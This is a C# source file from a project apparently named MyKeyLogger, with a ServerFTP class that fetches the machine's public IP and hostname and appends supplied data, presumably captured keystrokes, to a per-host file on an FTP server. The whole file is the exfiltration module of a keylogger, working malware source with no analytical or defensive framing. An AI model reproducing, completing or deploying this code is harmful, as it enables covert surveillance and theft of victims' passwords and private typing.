using System;
using System.IO;
using System.Net;
using System.Text;

namespace MyKeyLogger
{
	public class ServerFTP
	{
		public ServerFTP(){}

		
		public static void ConnectionServer(string data)
		{	
			string hostname = Dns.GetHostName();
			string myIP = "";
			string server = "";
			WebClient client = new WebClient();
		
			FtpWebRequest request;
			
			try {
					myIP = client.DownloadString("https://api.ipify.org");
					server = "ftp://127.0.0.1/" + myIP;
					request = (FtpWebRequest)WebRequest.Create(server);
					request.Credentials = new NetworkCredential("test", "");
					request.Method = WebRequestMethods.Ftp.MakeDirectory;
					WebResponse response = request.GetResponse();
			} catch (Exception ex){
			}
			
			server = "ftp://127.0.0.1/" + myIP + "/" + hostname + ".txt";
			request = (FtpWebRequest)WebRequest.Create(server);
			request.Credentials = new NetworkCredential("test", "");

            request.Method = WebRequestMethods.Ftp.AppendFile;
	       
			Stream requestStream = request.GetRequestStream();		
			byte[] buffer = Encoding.UTF8.GetBytes(data);
			request.ContentLength = buffer.Length;				
			requestStream.Write(buffer, 0, buffer.Length);
			requestStream.Close();
		}
	}
}
